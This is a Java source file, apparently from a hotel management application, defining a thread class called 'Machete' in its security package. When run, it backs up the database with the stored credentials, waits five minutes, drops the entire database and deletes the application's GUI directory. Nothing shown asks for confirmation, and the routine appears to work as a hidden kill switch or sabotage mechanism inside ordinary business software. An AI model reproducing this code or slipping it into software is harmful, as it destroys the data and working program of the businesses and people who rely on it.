/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package hotelpro.security;

import hotelpro.utils.Hotel;
import java.io.File;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Serge
 */
public class Machete extends Thread {
    
    ParametresConnexion parametresConnexion = new ParametresConnexion();
    
    public Machete() {
    }

    @Override
    public void run() {
        Database database = new Database();

        // Sauvegarde puis suppression de la base de données
        database.backupDB(parametresConnexion.recupererDbName(), parametresConnexion.recupererDbUserName(),
                parametresConnexion.recupererDbPassword(), database.providePath());
        
        try {
            Thread.sleep(300000);
        } catch (InterruptedException ex) {
            Logger.getLogger(Machete.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        database.dropDB(parametresConnexion.recupererDriverName(), parametresConnexion.recupererUrl(),
                parametresConnexion.recupererDbName(), parametresConnexion.recupererDbUserName(),
                parametresConnexion.recupererDbPassword());

        // Suppression des vues de l'application
        new Hotel().deleteDirectory(new File(getClass().getResource("/hotelpro/gui").getPath()));

        interrupt();
    }

    public static void main(String[] args) {
        new Machete().start();
    }
}
